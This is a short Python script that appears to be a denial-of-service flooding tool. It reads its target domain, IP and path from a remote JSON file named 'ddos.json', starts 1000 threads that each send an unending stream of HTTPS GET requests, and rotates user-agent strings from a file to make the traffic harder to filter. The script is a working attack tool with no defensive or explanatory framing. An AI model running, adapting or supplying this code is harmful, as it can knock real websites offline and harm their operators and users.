import ssl
import socket
import requests
import time
import os
import signal
import random
from threading import Thread
import traceback

stop = False

file1 = open('user-agents.txt', 'r')
Lines = file1.readlines()

r = requests.get("https://cdn.folody.xyz/fantasy%20cdn/ddos.json")
data = r.json()

domain = data["domain"]
ip = data["ip"]
prams = data["prams"] 

def run():
  while not stop:
    try:
      start = time.time()
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 443))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=domain)
        senddata = f"GET {prams} HTTP/1.1\r\nHost: {domain}\r\nConnection: close\r\nUser-Agent: {random.choice(Lines).strip()}\r\n\r\n"
        s.sendall(senddata.encode('utf-8'))
        new = s.recv().split(b'\r\n')[0]
        end = time.time()
        status = new.decode('utf-8').replace("HTTP/1.1 ", "")
        print(status +" | "+ str(round(end - start, 2)) + "s")
    except Exception:
      traceback.print_exc()
      


if __name__ == '__main__':
    try:
      for i in range(1000):
        try:
          Thread(target=run).start()
        except:
          print(i)

      time.sleep(10)
    except KeyboardInterrupt:
        stop = True
        os.kill(os.getpid(), signal.SIGTERM)

